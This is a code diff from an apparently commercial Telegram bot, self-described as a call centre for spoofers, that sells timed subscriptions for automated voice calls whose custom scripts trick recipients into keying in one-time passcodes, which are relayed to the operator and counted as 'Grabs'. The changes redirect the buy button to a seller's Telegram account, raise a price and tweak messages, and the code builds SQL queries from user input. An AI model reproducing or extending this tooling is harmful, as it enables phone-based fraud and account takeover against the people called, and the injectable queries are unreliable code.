@@ -140,7 +140,8 @@ This Bot is a tool for making automated voice call & A call centre for Spoofer""
     name = message.from_user.first_name
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     item0 = types.InlineKeyboardButton(text="💷 Price", callback_data="/price")
-    item1 = types.InlineKeyboardButton(text="🛒 Buy", callback_data="/buy")
+    # item1 = types.InlineKeyboardButton(text="🛒 Buy", callback_data="/buy")
+    item1 = types.InlineKeyboardButton(text="🛒 Buy", url='https://t.me/RomanSAGE')
 
     item2 = types.InlineKeyboardButton(text="🔑 Redeem", callback_data="/redeem")
     item3 = types.InlineKeyboardButton(text="🆘 Support", callback_data="/support")
@@ -182,7 +183,7 @@ def Price_list(message):
 
 💵<b> 1 Day</b> = 30$ - 2.7K INR 
 💵<b> 3 Days </b>= 70$ - 6.3K INR
-💵<b> 7 Days</b> = 110$ - 11K INR
+💵<b> 7 Days</b> = 120$ - 12K INR
 💵<b> 15 Days </b>= 220$ - 20K INR
 💵<b> 28 + 2 days</b> = 440$ - 40K INR
 
@@ -240,7 +241,7 @@ def community(message):
         item1 = types.InlineKeyboardButton(text="Owner 🧑", url='https://t.me/RomanSAGE')
         item2 = types.InlineKeyboardButton(text="Group 💪", url='https://t.me/MonsoonDiscussion')
         item3 = types.InlineKeyboardButton(text="Channel 💪", url='https://t.me/MonsoonApi')
-        item4 = types.InlineKeyboardButton(text="Vouches 🔢", url='https://t.me/MonsoonOTP')
+        item4 = types.InlineKeyboardButton(text="Vouches 🔢", url='https://t.me/MonsoonOTPVouches')
         
         
         if cdata!=None:
@@ -265,7 +266,7 @@ def Start_back(message):
         name = message.from_user.first_name
         keyboard = types.InlineKeyboardMarkup(row_width=2)
         item0 = types.InlineKeyboardButton(text="💷 Price", callback_data="/price")
-        item1 = types.InlineKeyboardButton(text="🛒 Buy", callback_data="/buy")
+        item1 = types.InlineKeyboardButton(text="🛒 Buy", url='https://t.me/RomanSAGE')
 
         item2 = types.InlineKeyboardButton(text="🔑 Redeem", callback_data="/redeem")
         item3 = types.InlineKeyboardButton(text="🆘 Support", callback_data="/support")
@@ -469,10 +470,10 @@ def Profile_def(message):
                         bot.edit_message_caption(chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],caption=f"""*
 Chat ID :{id} 
 Chat Name : {name}
-Subscription : Active ✅
-Valid till: {cdata[2]} 💖
+Subscription : Active
+Valid till: {cdata[2]} 
 Calls  : {cdata[10]}
-Grabs: {cdata[9]} 📞                              
+Grabs: {cdata[9]}                              
         *""",parse_mode='markdown',reply_markup=keyboard)
                     except:
                         send_welcome(message)
@@ -483,10 +484,10 @@ Grabs: {cdata[9]} 📞
                         bot.edit_message_caption(chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],caption=f"""*
 Chat ID {id} 
 Chat Name : {name}
-Subscription : Expired ✅
-Valid till: {cdata[2]} 💖
+Subscription : Expired 
+Valid till: {cdata[2]} 
 Calls  : {cdata[10]}
-Grabs:  {cdata[9]} 📞*""",parse_mode='markdown',reply_markup=keyboard)
+Grabs:  {cdata[9]} *""",parse_mode='markdown',reply_markup=keyboard)
                         delete_data(id) 
             else:
                 bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
@@ -524,7 +525,7 @@ def redeem_done(message):
         if uresp==1:
             time.sleep(3)
             days=user_day_check(id)
-            bot.send_message(message.from_user.id, f"*Redeemed {days} days.*",parse_mode='markdown')
+            bot.send_message(message.from_user.id, f"Redeemed {days} days.",parse_mode='markdown')
             send_welcome(message)
         elif uresp==0:
             bot.send_message(message.from_user.id, f"*⚠️Invalid key⚠️*",parse_mode='markdown')
@@ -615,7 +616,7 @@ def First(message):
              print(script1)
              c.execute(f"UPDATE custom_scripts SET intro='{script1}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send2 =bot.send_message(message.chat.id, "*Enter part two of Script.\n(Play - Audio for OTP Digits)*",parse_mode='markdown')
+             send2 =bot.send_message(message.chat.id, "Enter part two of Script.\n(Play - Audio for OTP Digits)",parse_mode='markdown')
              bot.register_next_step_handler(send2,Second)
 
 def Second(message):
@@ -648,7 +649,7 @@ def Fifth(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET last='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "*Number of OTP digits you want to capture*",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "Number of OTP digits you want to capture",parse_mode='markdown')
              bot.register_next_step_handler(send3,OTP_DIGITS)
 def OTP_DIGITS(message):
              id = message.from_user.id
@@ -862,7 +863,7 @@ def custom_confirm1(message):
    
 }
         requests.post(url, json=data)
-        bot.send_message(chat_id,f"*Correct Digits marked*",parse_mode='markdown')
+        bot.send_message(chat_id,f"*Code Accepted*",parse_mode='markdown')
         time.sleep(3)
         callhangup(call_control_id)
 
@@ -944,7 +945,7 @@ def custom_prebuild_script_call(script_id,chatid):
     elif event == "dtmf.entered":
         data = request.get_json()
         digit =  data['digit']
-        bot.send_message(chatid,f"""*Digit Received -> {digit}*""",parse_mode='markdown')
+        bot.send_message(chatid,f"""*Digit Received {digit}*""",parse_mode='markdown')
         
     elif event == "dtmf.gathered":
         data = request.get_json()
